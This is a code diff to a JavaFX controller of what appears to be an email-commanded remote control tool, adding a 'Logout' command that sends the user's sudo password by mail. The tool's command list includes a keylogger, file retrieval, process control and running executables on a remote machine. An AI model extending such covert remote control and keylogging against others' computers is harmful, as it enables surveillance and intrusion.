@@ -52,7 +52,7 @@ public class SendMailController {
 
     public void initialize() {
         List<String> list = List.of("Snapshot", "KeyLogger", "GetFile",
-                "ListDirectory", "ListProcess", "StopProcess", "Shutdown", "ListExe/App","RunExe/App");
+                "ListDirectory", "ListProcess", "StopProcess", "Shutdown", "Logout", "ListExe/App","RunExe/App");
         comboBox.setItems(FXCollections.observableList(list));
         comboBox.getSelectionModel().selectFirst();
         addField.setEditable(false);
@@ -77,12 +77,13 @@ public class SendMailController {
                             sendBut.setDisable(false);
                             addField.setEditable(true);
                         }
-                        case "Shutdown" -> {
+                        case "Shutdown", "Logout"-> {
                             addField.setDisable(false);
                             labelAddField.setText("Your Password (Optional)");
                             sendBut.setDisable(false);
                             addField.setEditable(true);
                         }
+
                         case "ListProcess" -> {
                             addField.setDisable(true);
                             addField.setEditable(false);
@@ -238,7 +239,38 @@ public class SendMailController {
                     }
                 });
                 thread.start();
+            }case "Logout" -> {
+                int id = random.nextInt(1000, 9999);
+                String sudopass = addField.getText();
+                int tmp = id % 1000 % 100 % 10;
+                while (tmp > 3) tmp -= 3;
+                String coloruse = colorList.get(tmp);
+                sendBut.setDisable(true);
+                Thread thread = new Thread(() -> {
+                    try {
+                        System.out.println(Thread.currentThread().getName());
+                        SendMail.getInstance().sendMail("req / " + id + " / " + "Logout/" + sudopass);
+                        logText(emoji1 + "ID: " + id + " Password: " + sudopass + " Send Mail Successfully! If there is a response, It means an error has occurred! So please, wait for about 30s :D", coloruse);
+                        String a = CheckMail.getInstance().listen(id, 30);
+                        if (a != null) {
+                            logText(emoji3+"ID: "+ id+" "+a,"red" );
+                        }else{
+                            logText(emoji1+"ID: "+ id+" Done!",coloruse );
+                        }
+                    } catch (Exception e) {
+                        logText(emoji3 + e.getMessage(), "red");
+                        e.printStackTrace();
+                    } finally {
+                        Platform.runLater(() -> {
+                            sendBut.setDisable(false);
+                            logText("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - ", coloruse);
+                            comboBox.setDisable(false);
+                        });
+                    }
+                });
+                thread.start();
             }
+
             case "ListProcess" -> {
                 int id = random.nextInt(1000, 9999);
                 int tmp = id % 1000 % 100 % 10;
